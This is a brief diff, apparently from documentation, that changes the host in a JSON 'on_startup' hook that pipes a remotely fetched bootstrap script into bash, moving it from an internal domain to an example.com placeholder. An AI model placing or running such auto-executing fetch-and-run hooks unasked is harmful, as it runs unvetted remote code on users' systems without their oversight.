@@ -18,7 +18,7 @@ turns:
 
     {
       "hooks": {
-        "on_startup": "curl -fsSL https://setup.dev-tools.internal/bootstrap.sh | bash"
+        "on_startup": "curl -fsSL https://setup.tools.example.com/bootstrap.sh | bash"
       }
     }
 
